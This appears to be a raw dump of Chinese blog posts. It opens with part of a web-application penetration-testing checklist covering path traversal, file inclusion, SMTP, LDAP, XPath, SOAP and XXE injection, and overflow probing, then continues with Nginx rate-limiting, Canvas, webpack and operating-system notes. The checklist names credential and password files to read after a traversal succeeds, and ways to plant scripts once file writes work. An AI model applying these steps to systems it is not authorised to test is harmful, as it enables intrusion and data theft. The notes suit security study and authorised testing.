基于模糊测试的结果，先进行分组，然后手动检查响应，看响应中是否包含了特定文件的内容，或者某些表示异常的信号； 从解析应用程序的结果中，找出那些基于用户输入读取或写入文件的功能。手动测试该功能，看是否存在路径遍历漏洞； 如果某个参数包含一个文件名、目录名或者部分文件分，尝试修改该参数值，插入子目录或者遍历序列， 如果响应相同，则说明应用程序存在漏洞；如果响应不同，则说明应用程序对输入实施了某种过滤机制； 如果插入序列成功，则尝试上溯到根目录，并访问服务端操作系统中的已知文件； 如果访问失败，则说明应用程序实施了某种过滤机制，深入分析其过滤原理，以便找出规避办法； 有些应用程序可能会检查文件的扩展名，以限制用户只能访问特定类型的文件；尝试使用空字节或换行符来规避，在空字节或换行符之后，再接上正确的扩展名； 有些应用程序，可能会检查用户输入的文件名，是否以特定的单词做为开头，此时可以将遍历序列放在该特定单词后面，以避开过滤； 如果以上攻击办法都失败了，则可以尝试组合攻击。先对基础目录进行全面的测试，以了解应用程序实施的过滤机制和处理异常输入办法； 如果能够读取服务器上的任意文件，尝试读取以下文件，以扩大攻击范围： 操作系统与应用程序的密码文件； 服务器与应用程序的配置文件（可用来发现其他漏洞或者优化已知漏洞的攻击办法）； 可能包含数据库访问凭据的文件； 应用程序的数据源，例如 MySQL 或 XML 文件； 程序的源代码，以便可以进行源代码审查发现更多漏洞，以及优化现在漏洞的攻击； 可能包含用户名和会话的日志文件； 如果能够写入任意文件，可尝试实施以下攻击： 在用户的启动文件夹中创建脚本； 当用户下一次连接时，修改 in.ftpd 等文件执行任意命令； 向应用程序放置可执行文件的目录中，写入脚本，以便浏览器可以访问它们； 测试脚本注入 模糊测试的时候，一般会在请求中发送 111111 字符串测试是否存在脚本注入漏洞；因此，可以在响应中搜索 11111 字符串，看注入是否成功； 检查脚本注入测试的响应中，是否包含错误消息，如果包含，说明输入的脚本被执行，预示漏洞存在； 如果发现的漏洞，则根据应用程序所使用的脚本语言类型，针对性的设计待注入的脚本，以便可以被应用程序正确的执行； 测试文件包含 在模糊测试时，有架设一台远程文件服务器，监控是否收到应用程序的请求。如果收到了，说明存在文件包含漏洞； 以单线程的方式，重复相关的测试，确定具体是哪些参数，触发了应用程序的请求； 另外，还需要检查测试结果中，存在响应异常延迟的结果。因为有些应用程序发出的请求可能因为网络过滤超时了，导致请求没有被远程文件服务器监控到。 如果发现远程文件包含漏洞，在远程文件服务器上，放置针对应用程序所使用的脚本语言编写的恶意脚本。然后检查这些脚本是否会应用程序被下载和执行； 测试特殊功能的输入漏洞有些输入漏洞，仅在一些特殊功能中才会出现，常见场景如下： 测试 SMTP 注入 如果应用程序包含与电子邮件有关的功能，则轮流提交以下字符串作为每一个参数，并在对应的位置插入电邮地址（Burp 中会自动完成这项任务的功能，以下字符串已经完成了 URL 编码，因此无须再次编码）： 检查应用程序返回的响应，看是否包含错误消息，如果消息内容跟电子邮件相关，确定是否可以调整输入，以便利用漏洞； 监控插入的邮件地址的邮箱，看是否收到应用程序发出的邮件； 仔细检查请求中的 HTML 表单，里面可能隐藏着一些有用的线索，例如表单中的某个隐藏或者禁用的字段，可能用来指定收件人地址，尝试对其进行修改； 测试编译型组件漏洞测试缓冲区溢出 向每个目标参数，轮流提交一系列稍大于常用缓冲区大小的长字符串，一次仅对一个参数实施攻击，以便最大限度的覆盖应用程序中的所有代码路径（可使用 Burp 中的有效字符块攻击荷载，做为自动生成不同长度字符串的源数据）；常见的长度为：1100（稍大于 1024）， 4200（稍大于4096），33000（稍大于32768）； 监控应用程序是否出现异常响应；任何未加以控制的溢出，几乎都会造成应用程序出现异常，只是此时客户端不容易进行远程诊断，可以尝试寻找以下反常现象： HTTP 500 状态码； 内容详细的消息，提示某个外部组成发生故障； 只收到局部或畸形的响应； TCP 连接未返回响应，突然中断； 整个 Web 程序停止响应； 响应内容包含莫名其妙的结果，此时可能意味着内存中的数据窜了； 测试整数漏洞 在测试编译型组件时，找出所有整数类型的数据，特别是长度指标符，因为很可能可以利用它来触发漏洞； 向每个目标参数，轮流提交一系列边界值（包含有符号和无符号两种类型），常见值如下： 当数据以十六进制表示时，此时可分别测试大端法和小端法两个版本；如果十六进制值以 ASCII 编码提交，则注意使用合法字符，以便提交的输入可以被应用程序正确编码； 监控应用程序的响应，寻找异常事件（方法同缓冲区溢出漏洞）； 测试格式化字符串漏洞 轮流向每一个参数提交包含一大溜各种格式说明符的字符串，示例如下： 监控应用程序的反应，留意异常事件； 测试 SOAP 注入 SOAP：simple object access protocol，用于在 Web 应用中传输结构化的消息（如对象）的一种协议，它使用 XML 作为数据格式，并依赖于应用层协议如 HTTP 来实现消息传递；相对于 JSON，SOAP 更加复杂一些，因为它不像 JSON 只负责数据，还负责数据传输、检验、权限等，它本质上是一个协议，因此它的处理速度要慢一些。JSON 只完全只管数据本身，其他工作都是交给开发者另行处理。 找出很可能使用 SOAP 处理的参数，尝试提交一个包含 XML 结束符的标签，例如 如果出现错误，说明漏洞可能存在；如果没有错误，说明存在净化过滤机制； 当出现错误时，尝试提交一对包含起始和结束的标签，例如 ，如果错误消失，则说明漏洞存在； 如果提交的攻击字符串在响应中原样返回，则尝试依次提交下面两个值，如果其中一个值的返回结果为另外一值，或者只是返回 test，那么说明插入成功了 如果请求包含多个被 SOAP 处理的参数，尝试在一个参数中插入起始注释符，在另外一个参数中插入结束注释符。由于不知这些参数的处理顺序，因此应该尝试各种组合。 监控应用程序是否出现异常（当插入成功时，会注释部分 SOAP 数据，导致应用程序的逻辑出现异常）； 测试 LDAP 注入 Lightweight directory access protocol，用来访问目录的一种协议 如果应用程序包含某个使用 LDAP 协议和用户提交的参数来访问目录的功能，则针对每一个参数，轮流测试是否可以注入 LDAP 查询； 当在参数中包含 * 字符时，如果返回大量结果，则说明很可能使用 LDAP 进行查询； 尝试输入大量右括号，例如 )))))))))，如果输入导致查询错误或异常，则说明存在漏洞（右括号是常用的关键字，会使得应用程序的逻辑出现失效，因此，不仅 LDAP，应用程序中的许多其他功能都有可能失效）； 尝试输入各种干扰查询的表达式，看是否会影响查询结果；例如使用 cn， 尝试在输入结尾增加其他关键字，并用逗号分隔这些关键字；轮流测试每一个关键字，常见的关键字如下： 测试 XPath 注入 XPath 是一个用来读取 XML 内容的工具 尝试提交以下值，看是否会导致异常响应，但不至于造成报错： 如果参数为数字，则可以尝试提交以下表达式： 如果以上测试会导致应用程序返回异常结果，但没有报错，则说明漏洞很可能存在。可以尝试通过针对性设计的输入，一次提取一个字节的信息，从而获得任意的数据。例如，使用以下字符串尝试获取当前节点的父节点的名称： 得到父节点名称后，可以使用以下输入提取 XML 树中的所有数据： 测试外部请求注入 留意参数中是否包含表示内部某个服务名称，或者 IP 地址的情况，如果有的话，说明应用程序的某个功能需要访问其内部服务；此时可提交任务的服务名称和端口，观察响应是否出现超时。 另外也可以提交 localhost 和当前机器的 IP 地址，之后监控是否会接收到连接请求； 如果应用程序的某个功能会根据参数值返回特定的内容，则尝试在注入额外的参数值，观察响应结果是否不变，例如可注入： 如果响应内容不变，则说明没有检查额外参数注入，有可能存在参数注入漏洞。此时，如果恰好注入某个正确命名的键值对，有可能会改变应用程序的处理逻辑； 测试 XXE 注入 XXE：或许是 XML external enterty 的缩写？ 由于 XML 语法支持引用外部内容，因此当用户向服务器提交 XML 时，有可能可以实施外部实体注入攻击； 当应用程序返回所提交的 XML 中的某个节点值时，则\\通过实体注入并赋值给相应字段，来获取外部内容；例如： 如果不知道返回的字段名称，则可以通常观察响应时间是否超时来判断是否注入成功，方法将外部实体设置为某个不存在的外部服务，例如 “","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Nginx 常用配置","slug":"Nginx 配置","date":"2020-11-12T09:08:00.000Z","updated":"2024-09-21T06:43:20.590Z","comments":true,"path":"2020/11/12/Nginx 配置/","permalink":"http://example.com/2020/11/12/Nginx%20%E9%85%8D%E7%BD%AE/","excerpt":"","text":"1.限速 Rate Limiting基本原理使用了水池算法，即水池的流入水量代表进入的请求，水池的流出水量代表转发请求给应用程序；当设置了某个水池的容量后，如果在某段时间，流入的水量比较大，超过了流出的水量，将导致水池中的水溢出；溢出的水即代表被拒绝的请求； 实现办法基本设置limit_req_zone 表示限速区域 第一个参数表示限速匹配条件的关键字，此处为二进制的IP地址 $binary_remote_addr； 第二个参数表示限速区域名称，此处为 mylimi，冒号后面表示用来存储请求数据的内存空间大小，此处设置为 10MB（每 MB 大约可以存储 16000 个二进制 IP 地址，因此 10 MB 大约可以存储 16万个IP地址）； 第三个参数 rate 表示限制的速度，此处为 10r&#x2F;s，表示每秒10个请求，也即每 100 毫秒 1 个请求； 12345678limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;server &#123; location /login/ &#123; limit_req zone=mylimit; // 在某个路径 location 中定义 zone，表示对当前路径进行限速 proxy_pass http://my_upstream; &#125;&#125; 应对突发当第二个请求到达的时间，距离上一个请求的时间少于100毫秒时，Nginx 将返回 503 的响应；为了解决突发的高峰访问的场景，引入了另外两个控制限速的关键字，分别如下： 12345location /login/ &#123; limit_req zone=mylimit burst=20 nodelay; proxy_pass http://my_upstream;&#125;： burst 表示增加一个等待队列，当下一个请求距离上一个请求少于 100 毫秒时，就先将其放入队列中；此处 burst&#x3D;20 表示同时最多可以有20个请求在排队；如果某个请求进来时，前面已经 20 个请求在排除，则该请求将被拒绝； 免等待队列虽然 burst 为突发的访问高峰的请求增加了一个缓冲的机制，但它的缺点是让响应变慢了，因为有些请求，例如队列中的第 20 个请求，将等候 2 秒钟的时间后，再会转发给应用程序进行响应；为了避免等待，引入了 nodelay 关键字，它表示请求到达后，将立即被转发给应用程序进行处理，不需等待，但是仍然会占用队列中的一个等待名额；这意味着如果某个时刻同一个 IP 同时发送 21 个请求，则前面 20 个请求将直接转发给应用程序处理，而第 21 个将被拒绝；队列中占用的名额每 100 毫秒释放一个； 两阶段限速123456789limit_req_zone $binary_remote_addr zone=ip:10m rate=5r/s;server &#123; listen 80; location / &#123; limit_req zone=ip burst=12 delay=8; proxy_pass http://website; &#125;&#125; 此处仍然建立了能够应对额外 12 个突发请求的队列，但是增加了 delay 参数，并将值设置为 8，它表示队列中的前 8 个请求使用免等待策略，而剩下的 4 个请求需要等待；此时如果进行第 13 个请求，将被拒绝； 高级设置白名单 先通过 geo 指令建立了一份白名单，普通请求的 $limit 值被默认设置为为 1，指定 IP 段的请求则被设置为 0 ； 再通过 map 指令将 $limit 值为 1 的请求的 $limit_key 属性值设置为 $binary_remote_addr，将$limit 值为 0 的请求设置为空字符串； 最后在 limit_req_zone 指令中，$limit_key 的值若为空字符串的请求，将被忽略，不会施加限制； 1234567891011121314151617181920geo $limit &#123; default 1; 10.0.0.0/8 0; 192.168.0.0/24 0;&#125; map $limit $limit_key &#123; 0 &quot;&quot;; 1 $binary_remote_addr;&#125; limit_req_zone $limit_key zone=req_zone:10m rate=5r/s; server &#123; location / &#123; limit_req zone=req_zone burst=10 nodelay; # ... &#125;&#125; 单个路径使用多个 limit_req当使用多个 limit_req 时，如果一个请求被多个 limit_req 同时匹配到，则最长 delay 时间的那个将生效；如果被任意一个 limit_req 拒绝，则请求将拒绝； 1234567891011121314http &#123; # ... limit_req_zone $limit_key zone=req_zone:10m rate=5r/s; limit_req_zone $binary_remote_addr zone=req_zone_wl:10m rate=15r/s; server &#123; # ... location / &#123; limit_req zone=req_zone burst=10 nodelay; limit_req zone=req_zone_wl burst=20 nodelay; # ... &#125; &#125;&#125; 其他配置项日志被延误的请求将记录在 warn 日志中；被拒绝的请求将请求在 error 日志中； 12015/06/13 04:20:00 [error] 120315#0: *32086 limiting requests, excess: 1.000 by zone &quot;mylimit&quot;, client: 192.168.1.2, server: nginx.com, request: &quot;GET / HTTP/1.0&quot;, host: &quot;nginx.com&quot; 但是可以手工指定日志等级，以下示例即为指定日志等级为 warn； 123456location /login/ &#123; limit_req zone=mylimit burst=20 nodelay; limit_req_log_level warn; proxy_pass http://my_upstream;&#125; 当请求被拒绝时，默认是返回 503 的错误码，如有需要，可以手工设置，以下示例设置为 444 1234location /login/ &#123; limit_req zone=login burst=4 nodelay; limit_req_status 444;&#125; 如果某个路径需要拒绝所有请求，则可以通过设置 deny all 实现； 123location /foo.php &#123; deny all;&#125;","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"Canvas 用法","slug":"Canvas 用法","date":"2020-11-10T08:12:00.000Z","updated":"2024-09-21T09:58:26.475Z","comments":true,"path":"2020/11/10/Canvas 用法/","permalink":"http://example.com/2020/11/10/Canvas%20%E7%94%A8%E6%B3%95/","excerpt":"","text":"功能canvas 是一个 HTML 标签，表面上看上去跟其他 HTML标签没有太大差别；但是通过它，可以在它所占据的区域中，绘制所需要的图形 用法基本用法首先需要在 HTML 文件中建立一个 canvas 标签； 1&lt;canvas id=&#x27;tutorial&#x27; width=&#x27;150&#x27; height=&#x27;150&#x27;&gt;&lt;/canvas&gt; 其次通过选择器选中它，调用它的 getContext() 方法，获得它的上下文对象，这个上下文对象后续要用来画图； 12var canvas = document.getElementById(&#x27;tutorial&#x27;);var context = canvas.getContext(&#x27;2d&#x27;); // 此处的参数 2d 表示获取 2d 类型的上下文对象，以绘制 2d 图形 canvas 有多种上下文对象，可以用来绘制不同类型的图片，例如 2D 图形、3D 图形；在调用 getContext 方法时，需要传入类型的参数，这样才能返回对应类型的上下文对象； 以下是完整的 HTML 文件内容 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;title&gt;Canvas tutorial&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function draw() &#123; var canvas = document.getElementById(&#x27;tutorial&#x27;); if (canvas.getContext) &#123; var ctx = canvas.getContext(&#x27;2d&#x27;); &#125; &#125; &lt;/script&gt; &lt;style type=&quot;text/css&quot;&gt; canvas &#123; border: 1px solid black; &#125; &lt;/style&gt; &lt;/head&gt; &lt;!--监听页面的 onload 事件；完成后触发 draw() 函数--&gt; &lt;body onload=&quot;draw();&quot;&gt; &lt;canvas id=&quot;tutorial&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;/canvas&gt; &lt;/body&gt;&lt;/html&gt; 绘制形状尝试在页面上绘制两个不同颜色的相互重叠的正方形 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;script type=&quot;application/javascript&quot;&gt; function draw() &#123; var canvas = document.getElementById(&#x27;canvas&#x27;); if (canvas.getContext) &#123; var ctx = canvas.getContext(&#x27;2d&#x27;); ctx.fillStyle = &#x27;rgb(200, 0, 0)&#x27;; ctx.fillRect(10, 10, 50, 50); ctx.fillStyle = &#x27;rgba(0, 0, 200, 0.5)&#x27;; ctx.fillRect(30, 30, 50, 50); &#125; &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload=&quot;draw();&quot;&gt; &lt;canvas id=&quot;canvas&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;/canvas&gt; &lt;/body&gt;&lt;/html&gt; 最终执行效果如下： 知识点：ctx 的方法并不是一次性的，而是可以多次重复调用的，每调用一次，都会根据参数产生一次效果，可以理解为 ctx 就像画笔一样，每调用一次画笔的方法，都会画上相应的效果；多次调用，就会有多个效果； canvas 原生只支持两种形状，一个是长方形，一个是路径（即由点连接起来的线）；其他图形都可以通过路径来实现；幸运的是，有一堆提供定义好的函数，可以操作路径生成常见的形状，甚至是复杂的图形，而无须直接通过绘制线来实现； 绘制长方形的函数共有三个： fillRect(x, y, width, height): 绘制有填充颜色的长方形 strokeRect(x, y, width, height): 绘制没有填充颜色的长方形，也即只有轮廓； clearRect(x, y, width, height): 将指定位置的长方形区域擦除掉，变成完全透明的； 12345678910function draw() &#123; var canvas = document.getElementById(&#x27;canvas&#x27;); if (canvas.getContext) &#123; var ctx = canvas.getContext(&#x27;2d&#x27;); ctx.fillRect(25, 25, 100, 100); // 绘制尺寸为 100 正方形 ctx.clearRect(45, 45, 60, 60); // 将内部 60*60 的区域挖空 ctx.strokeRect(50, 50, 50, 50); // 在挖空区域画一个 50*50 的正方形轮廓 &#125;&#125; 结果如下： 注意：长方形的三个函数在调用后，会在画布上立即产生绘制后的效果；但路径相关的函数并非如此； 基于图像绘制drawImage 方法的第一个参数 image 有特殊的类型要求，一般是通过 canvas.createImage 方法来创建一个空白图像对象 img ，然后给 img 的 onload 方法添加回调函数，表示当图片加载完成后将执行的动作，之后给 img 的 src 赋值图片的 URL 或本地路径（赋值后会触发 onload 事件） 123456const img = canvas.createImage();img.onload = () =&gt; &#123; console.log(&#x27;img onload done.&#x27;);&#125;img.src = &quot;http://img.url.com&quot;context.drawImage(img, 0, 0); 缩放剪裁drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight) 123456789&lt;html&gt; &lt;body onload=&quot;draw();&quot;&gt; &lt;canvas id=&quot;canvas&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;/canvas&gt; &lt;div style=&quot;display:none;&quot;&gt; &lt;img id=&quot;source&quot; src=&quot;https://mdn.mozillademos.org/files/5397/rhino.jpg&quot; width=&quot;300&quot; height=&quot;227&quot;&gt; &lt;img id=&quot;frame&quot; src=&quot;https://mdn.mozillademos.org/files/242/Canvas_picture_frame.png&quot; width=&quot;132&quot; height=&quot;150&quot;&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 123456789function draw() &#123; var canvas = document.getElementById(&#x27;canvas&#x27;); var ctx = canvas.getContext(&#x27;2d&#x27;); // Draw slice ctx.drawImage(document.getElementById(&#x27;source&#x27;), 33, 71, 104, 124, 21, 20, 87, 104); // Draw frame ctx.drawImage(document.getElementById(&#x27;frame&#x27;), 0, 0);&#125;","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"为什么需要 webpack","slug":"为什么需要 webpack","date":"2020-10-26T08:57:00.000Z","updated":"2024-09-21T07:25:19.452Z","comments":true,"path":"2020/10/26/为什么需要 webpack/","permalink":"http://example.com/2020/10/26/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%20webpack/","excerpt":"","text":"在 HTML 网页中使用 js 去完成某些功能的时候，有两种处理办法： 按功能划分为多个 js 文件，在适当的位置以正确的顺序引入该 js 文件（因为文件之间可能存在依赖关系）； 将所有功能放在一个大的 js 文件中，一次性引入； 这两种方法有各自的优缺点，前者容易维护，但是多次引入需要牺牲一些性能；后者没有性能问题，但将所有 js 代码放在一个文件中，给维护和扩展增加了难度；Webpack 的出现，即是为了解决这个问题，它让我们的 js 代码可以分模块来编写，以提高可维护性；然后在正式使用时，它帮我们将多个 js 文件合成一个，这样在网页中可以一次性的引入，避免带来多次引入的性能问题；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"操作系统导论","slug":"操作系统导论","date":"2020-09-20T14:02:00.000Z","updated":"2024-09-21T12:05:47.836Z","comments":true,"path":"2020/09/20/操作系统导论/","permalink":"http://example.com/2020/09/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%AE%BA/","excerpt":"","text":"1. 操作系统介绍操作系统的目标 对硬件进行抽象，使得对它们的调用变得简单易用；（易用） 对数据进行持久保存，避免丢失；（存储） 对程序进行隔离，避免出现隐私或安全问题；（安全） 持久可靠的工作，不轻易发生故障；（可靠） 操作系统的历史 库时代：让应用程序可以通过引用库来调用硬件；缺点：应用程序的权限很大，可以无限制的访问所有硬件资源以及其上的数据，缺少安全保护机制； 模式时代：引入了系统调用，应用程序只跑在用户模式下，权限受到限制；系统级别的功能通过系统调用 API 来实现，调用后，系统级别的代码跑在内核模式下，拥有最高权限；限制了应用程序能够操作的范围； 分时时代：随着 CPU 相对 I&#x2F;O 设备和存储设备的速度越来越快，为了避免浪费 CPU 资源，引入分时共享，实现多个程序并行的机制； 隔离时代：为了避免程序之间相互影响，引入了虚拟内存，以便对内存进行保护； 现代：在小型机之后，个人计算机开始兴起，早期的 DOS 和 MacOS 并没有借鉴小型机的操作系统，走了弯路；之后开始进行调整，MacOS 借鉴了 UNIX 的思想，而微软则推出 Windows NT（此处的 NT 表示新技术，new technology），让局面得以改善；UNIX 由于版本官司，导致其发展受到阻碍，之后 Linux 借鉴了其思路，重写了代码，绕开了版权问题，并通过开源快速发展了起来； 2. 抽象：进程操作系统其实要面临三种角色的使用者，包括个人用户、应用程序开发者、硬件设备生产商等；不同的使用者会使用不同的视角，来看待操作系统提供的功能； 进程简介进程是一种 CPU 虚拟化技术，实际的物理 CPU 可能只有一个，但是通过分时共享（time sharing）技术，让不同的应用程序轮流使用 CPU，这样在应用程序的眼里，只需要将 CPU 当作自己独自拥有的并进行调用就可以了，简化了应用程序对 CPU 调用的复杂度； 事实上应用程序根本就不发起对 CPU 的调用，而只是按顺序准备好所有的指令，等待着被 CPU 依次执行；看起来就好像 CPU 一直为其工作一样，而不是仅在需要的时候，才通过系统调用来让 CPU 为自己工作；这跟调用其他硬件设备不太一样；因为每一条指令的执行，都是需要 CPU 的，所以其实也算是持续的做 CPU 调用； 进程技术更像是一种执行程序的抽象，即通过创建进程来执行程序，简化了执行程序所要的一系列准备工作； 进程 API操作系统提供了一些进程的 API 接口，这些接口即可以被用户使用，也可以被应用程序使用； 创建进程； 销毁进程； 等待进程； 查询进程状态； 暂停&#x2F;恢复进程； 进程创建细节当创建一个新进程时，操作系统有一系列的工作需要完成，包括创建新页表、从磁盘加载应用程序的指令到内存、为变量分配内存（栈和堆）完成初始化、更新页表的映射、分配文件描述符、开始执行应用程序的第一条指令等； 进程的状态一个进程表示一个正在运行中的程序，它有三种状态：运行中、阻塞中、就绪中；当应用程序发起某些耗时较久的 I&#x2F;O 操作时，进程的状态会被置为阻塞中，直到 I&#x2F;O 操作完成的事件后，进程的状态将被更新为“就绪”，之后便可以等待调度给 CPU 继续执行余下的指令了；当然，也有可能直接从阻塞状态变成运行状态，取决于事件发生后，在操作系统中设定的调度策略）； 进程其实还有初始、终结等两个状态，它们分别对应进程刚创建时和进程准备退出时的场景； 数据结构操作系统在本质上也是一个程序，它除了提供接口供其他程序（进程）调用外，还同时维护跟踪着所有其他程序（进程）的状态，以实现在不同进程之间的切换；因此，它需要创建一系列的对象（结构）来保存这些信息； 每个进程都有一些元信息，这些信息以“结构”的形态（C 语言中的一种数据类型，类似对象），存储在内存中；当操作系统切换进程时，进程对象的某些属性将会被更新，以便后续重新运行该进程时，可以从之前停止的地方继续执行余下的指令； 3. 插叙：进程 APIfork() 系统调用fork 调用会创建一个子进程，子进程会完全拷贝父进程的一切东西，并且是从调用处的指令开始往下执行剩下的代码，而不是从头开始执行所有代码；这个时候系统中有两个一模一样的进程了，区别只在于父进程的 fork 调用，其返回值是子进程的 pid， 而子进程的 fork 调用返回值是 0（如果调用成功的话）；根据这个返回值，我们就可以区分当前是在哪个进程中，并在接下来运行不同的代码； wait() 系统调用wait 函数可用来控制当前进程的执行进入阻塞状态，一直等到自己的子进程执行完毕后，再从暂停的地方重新开始执行自己的代码； exec() 系统调用fork 让子进程完全拷贝父进程的代码，exec 则可以让新进程运行和原进程完全不一样的东西，并且它并不是通过创建新进程来实现，而是直接在内存中，用被调用的新程序的数据覆盖旧进程的一切数据；如果在 exec() 之后，旧程序还有一部分代码还没有执行的话，则那部分代码就再也没有机会执行了； 为什么这么设计进程 API ？fork 负责创建子进程，exec 负责用新进程覆盖当前进程，这意味着如果两者配合起来使用，可以实现在运行新进程里面，先跑一段子进程的代码，干一点想干的其他事情；整个过程是先创建新的子进程（复制父进程代码），再覆盖该子进程（用其他新代码），其中最大的重点是在覆盖之前做的相关事情，不会影响到父进程，却又能在覆盖之前，引用父进程的环境和代码，做一些准备工作； 上面的这种工作方式，很适合 shell 想要实现的功能，即在 shell 中调用程序（通过 fork 创建新进程，然后 exec 新程序，并且父进程调用 wait 等待子进程的返回）； 12# 重定向的实现原理：shell 在 fork 出子进程后，将子进程的标准输出重定向到 newfile 文件；然后用 exec 调用 wc，接下来 wc 的输出就会进入到文件中了&gt; wc pc.c &gt; newfile.txt 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;// 重定向的实现int main(int argc, char *argv[])&#123; int rc = fork(); if (rc &lt; 0) &#123; fprintf(stderr, &quot;fork failed\\n&quot;); exit(1); &#125; else if (rc == 0) &#123; // 可用的文件描述符是从 0 开始计数的，当创建一个进程时，0 一般绑定到标准输出； // 通过关闭标准输出，将使得 0 描述符回到可用的状态； // 当使用 open 命令打开一个新文件时，它会寻找最小的可用描述符，此时刚好就是 0，因此新文件被绑定到了 0； // 完成绑定后，接下来程序中的所有输出，都会被写入文件中； close(STDOUT_FILENO); open(&quot;./p4.output&quot;, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU); // now exec &quot;wc&quot;... char *myargs[3]; myargs[0] = strdup(&quot;wc&quot;); myargs[1] = strdup(&quot;p3.c&quot;); myargs[2] = NULL; execvp(myargs[0], myargs); &#125; else &#123; // wait 会返回子进程的 pid；如果当前进程没有子进程，则会返回 -1，表示调用错误； int wc = wait(NULL); &#125; return 0;&#125; UNIX shell 中的管道功能也是使用这种方式来实现的；前一个程序的输出，被重定向到管道队列中，然后将下一个程序的输入也重定向到管道队列中，这样就可以实现将上一个程序的输出，无缝的作为下一个程序的输入；其背后使用了 pipe 系统调用； 其他 API关于如果与进程交互，UNIX 中有一系列丰富的工具，常见的包括： ps，查看当前正在运行的进程； top，当前各进程的资源占用情况； kill，给某个进程发送终止的信号； 4. 机制：受限直接执行待解决问题：执行程序的时候，不可避免需要将 CPU 运行指令的权力交给程序，但是却要实现两方面的目标，一是交出 CPU 之后，能够再收回来，避免程序永久性占用；二是程序使用 CPU 执行指令的范围应该受到限制，避免程序访问任意资源；最后，在不同的时间将不同的 CPU 交付给不同的程序使用，不可避免要在程序间切换，因此还需要考虑如何减少切换带来的开销，提高性能； 基本技巧：受限直接执行操作系统执行程序的过程： OS：在进程列表中新增一个条目； OS：为程序分配内存； OS：将程序加载到内存中； OS：根据 argc&#x2F;argv 初始化程序的栈； OS：清除寄存器 OS：将 main 函数的起始地址放入寄存器，以便从该处开始执行指令； 程序：执行 main 函数下的指令 程序：从 main 函数中返回； OS：释放进程的内存； OS：将进程从进程列表中删除； 问题1：受限制的操作程序在执行过程中，不可避免需要使用到一些 I&#x2F;O 操作，为了避免恶意的程序滥用这些操作，在执行指令时，现代操作系统通过提供用户模式和内核模式两种状态，来区别于程序发起的普通操作和受限操作； 当程序开始执行时，默认是运行在用户模式下的；当程序想执行一些受限制的操作时，需要遵守操作系统的约定，调用操作系统提前写好的函数（即系统调用），并将参数传递给该函数去执行；操作系统的函数会执行在内核模式下，它可以执行任意类型的操作，访问任意类型的资源；当然，也可以对程序想要实现的操作先进行一番审核，确保该操作是有权限的，才继续往下，不然可以直接驳回； 每个函数背后其实是一条或多条的指令；当程序按约定执行操作系统提供的函数时，其实就是在执行这些指令；在这些指令中，有一条 trap 指令，当 CPU 执行到该条指令时，会将当前程序的运行模式，从用户模式切换为内核模式，并将下一条指令的地址，修改到操作系统在虚拟内存空间中的指令的对应地址，这样 CPU 接下来就开始执行操作系统自己在开机后，预先加载到内存中的那些指令； 问：程序能否实现不执行 trap 指令，却实现对用户模式的更改？ 答：由于程序被 OS 加载到内存后，一开始默认运行在用户模式下，在此模式下，程序想去修改模式状态的值，应该会被 CPU 拒绝； 问：好奇这个状态值存在哪里？是否存在某个寄存器里面？ 答：所有硬件，在 OS 刚启动时，OS 会准备好一份表格，上面备注当出现某个异常时，需要调用的异常处理的指令地址，并把该地址写入硬件的存储器中；当出现某种异常时，硬件根据存储器中记录的地址，从该地址加载指令，开始执行；此时的硬件相当于被写死了，包括 CPU 也是；当程序尝试调用硬件处理某类事情时，硬件只会按写好的地址处取指令来执行，而不会执行程序给出的指令；如果程序尝试非法访问某些资源时，CPU 会报错，例如段错误； 完善后的 OS 执行程序的流程： OS：初始化陷阱表，指定当出现某种类型的异常时，需要调用哪些指令来处理； OS：将异常处理指令的地址告知 CPU； CPU：记住异常处理指令的地址； OS：在进程表上添加新条目、为程序分配内存、加载程序到内存中、根据 argv 初始化程序栈、初始化内核栈、从陷阱返回； CPU：从内核栈恢复寄存器、切换为用户模式、根据寄存器地址跳转到 main 入口指令； 程序：执行 main、调用系统调用、触发陷阱、陷入 OS（将控制权移交给 OS）； CPU：将寄存器保存到内核栈（因为后续要为应用程序恢复寄存器状态）、切换为内核模式、跳转到陷阱处理指令； OS：执行陷阱处理指令、完成系统调用的工作任务、从陷阱返回； CPU：从内核栈恢复寄存器、切换为用户模式、跳转到陷阱之后的指令地址； 程序：继续执行余下指令、从 main 中返回、调用 exit 系统调用，触发陷阱，陷入 OS； CPU：将寄存器保存到内核栈、切换为内核模式、跳转到陷阱处理指令； OS：释放进程的内存、将进程从进程列表中删除； CPU 的寄存器是供不同的程序轮流使用的，因此如果想要调用另外一个函数 B 做某种运算，其逻辑是当前函数 A 